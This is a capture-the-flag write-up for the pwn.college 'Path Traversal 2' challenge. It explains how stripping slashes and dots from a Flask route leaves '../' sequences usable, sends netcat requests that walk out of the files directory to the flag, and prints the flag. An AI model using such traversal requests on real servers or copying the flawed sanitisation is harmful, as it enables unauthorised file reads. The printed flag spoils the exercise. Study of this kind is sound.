---
layout: page
title: "🕵️‍♂️ Challenge: Path Traversal 2"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


**Category**: Web Security  
**Platform**: pwn.college  
**Level**: Intermediate  
**Vulnerability**: Path Traversal  
**Goal**: Read the `flag` file by bypassing directory restrictions.

---

## 🧩 Description

We’re given a Flask web app with endpoints at `/data` and `/data/<path>`, which serve files from the `/challenge/files/` directory. Our goal is to access the `flag` file located outside this directory.

---

## 🔎 Recon

### Step 1: Basic GET request

```bash
printf "GET /data HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Response:
```bash
Returns the content of index.html and lists available fortune files.
```
The endpoint works and hints at the existence of deeper files inside /files/fortunes.


---

## 🧠 Vulnerability Insight
The server code builds file paths like this:
```bash
requested_path = app.root_path + "/files/" + path.strip("/.")
```
The bug is in the use of .strip("/."). It removes only leading/trailing slashes and dots, but not sequences like ../../../. So, path traversal is still possible!
---

## Exploiting Path Traversal

### Step 2: Attempt to access directory (Fails)
```bash
printf "GET /data/fortunes HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
This returns a 500 error — probably because it's trying to read a directory, not a file.

### Step 3: Path traversal to access flag
```bash
printf "GET /data/fortunes/../../../flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Success! This bypasses the file restriction and accesses the flag.

Response:
```bash
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```

---

## Flag
```bash
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```

---
